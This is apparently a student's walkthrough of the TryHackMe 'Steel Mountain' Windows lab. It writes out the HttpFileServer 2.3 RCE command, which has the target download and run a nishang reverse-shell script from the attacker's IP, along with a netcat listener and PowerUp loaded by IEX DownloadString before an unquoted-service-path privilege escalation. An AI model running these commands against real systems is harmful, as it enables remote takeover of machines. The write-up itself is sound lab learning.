# THM : Steel Mountain


```toc
```

---
---
---
---

## Machine Information

| Contents      | Description                        |
| ------------- | ---------------------------------- |
| Name          | HTB/THM : Steel Mountain           |
| Difficulty    | Easy                               |
| OS            | Windows                            |
| Shell_Exploit | HttpFileServer ( HFS ) RCE Exploit |
| Priv_Esc      | Unquoted Service Path Vul'n                         |
| Miscellaneous | Make sure to not fall into rabbit holes                               |

---
---
---

## Scanning
### Nmap
> There seems to be a lot of open ports
> > ![[Pasted image 20221116212258.png]]
> > - We have SMB open thats surely a vector
> > - Lets start with the HttpFileServer cuz it might be straight forward.
> > - What is ==HTTPAPI httpd 2.0 (SSDP/UPnP==?

---
---
---

## Enumeration
### Web Browser 

#### a. Robots.txt
***N/A***

---

#### b. Basic Website Enumerations/Spidering
> Main web-page exists
> > ![[Pasted image 20221116212026.png]]
> > - Lets see the page source for more info!!!
> 
> 2nd HTTP port open at 8080
> > ![[Pasted image 20221116212453.png]]
> > - HttpFileServer 2.3 miight be vul'n. Lets take this as our first attack vector.
> > - Lets start with the searchsploit search and if there isnt any hits then we'll do Online search and Metasploit.
> > - If none works then there mght not be any exploits publically available and in that case we ll have to move to another attack vector.

---

#### c. Source Code
> Well we can see that the person in the image is called *Bill Harper*. Three is nothing else to see here I guess.
> > ![[Pasted image 20221116211943.png]]

---
---

### Searchsploit/Online DBs

> Lets do a searchsploit search
> > ![[Pasted image 20221116212937.png]]
> > - This is why I said its straight forward.
> > - Lets look at the POC
> > > ![[Pasted image 20221116213404.png]]
> > > - Well the script is straight forward, lets use **nishang/shells/Invoke-PowerShellTcp.ps1** to spawn a reverse powershell and take it from there.
> > > - Hope all you guys have niighag with you. Copy it to the current directory and 

---
---

### Gobuster Scan
***N/A***

---
---

### Other Enumerations
***N/A***

---
---
---

## Exploit

### a. Attack Vector
> we ll be using the nishang/shells/Invoke-PowerShellTcp.ps1 along wiith the RCE script
> - ***Commands***
> > `cp nishang/shells/Invoke-PowerShellTcp.ps1 .`
> > `cp Invoke-PowerShellTcp.ps1 rev-shell.ps1`
> > `Invoke-PowerShellTcp -Reverse -IPAddress Kali_IP -Port Listen_PORT`  --> add this to the end of the file.
> > 

---
---

### b. Mode of Attack
> Nshang Powershell script and HttpFileServer exploiit script
> - ***Commands***
> > -  `nc lnvp 7799`
> > - `python3 HttpFileServer.py 10.10.167.156 8080 "c:\windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://10.11.10.39:8000/rev-shell.ps1')"`
> > > ![[Pasted image 20221116214841.png]]
> > > ![[Pasted image 20221116214647.png]]
> 
> The user.txt flag
> > ![[Pasted image 20221116220034.png]]

---
---
---

## Priv_Esc

### a. Attack Vector
> Lets use powerUp to enumerate 
> - ***Commands***
> > - `cp /opt/PowerSploit/Privesc/PowerUp.ps1 .`
> > - `mv PowerUp.ps1 Pwr-Up.ps1`
> > - `python3 -m http.server`
> > - `IEX (New-Object Net.WebClient).DownloadString('http://10.11.10.39:8000/Pwr-Up.ps1')` **+** `Invoke-AllChecks`
> > - **OR**
> > - 

---
---

### b. Mode of Attack
> - Some basic Enumerations before going for the kill
> > - ![[Pasted image 20221116215755.png]]
> > > - lets keep this in mind
> 
> ***Vuln***
> - we Have 2 potentiial Candidates here
> > 1. *AdvancedSystemCareService9*
> > > ![[Pasted image 20221116221122.png]]
> > 2. *IObitUnSvr*
> > > ![[Pasted image 20221116221148.png]]
> > > - For CTF exploiting any of them will give you NT AUTHORTY\SYSTEM but in a penetratiin testing stand poiint, you have to check all of them. and record them systematically.
> 
> Lets check the details of the application wiith **sc query**
> > - `cmd.exe /c "sc qc IObitUnSvr"`
> > > ![[Pasted image 20221116225307.png]]
> > - `cmd.exe /c "sc qc AdvancedSystemCareService9"`
> > > ![[Pasted image 20221116225236.png]]
> 
> ***Lets Check the Permissions we have on the directories***
> > - `.\accessChk.exe /accepteula -uwc directory_name`
> > > Dont look deep into this cuz this **IObitUnSvr** is a rabbit hole, which is intentially made vul'n to throws the users into confusion.
> 
> 
> ***Fiinal Exploit***
> > - `cmd.exe /c "sc stop AdvancedSystemCareService9"`
> > - `cmd.exe /c "sc start AdvancedSystemCareService9"`
> > > ![[Pasted image 20221116225142.png]]
> > 
> > - `cmd.exe /c "sc stop IObitUnSvr"`
> > > ![[Pasted image 20221116225210.png]]




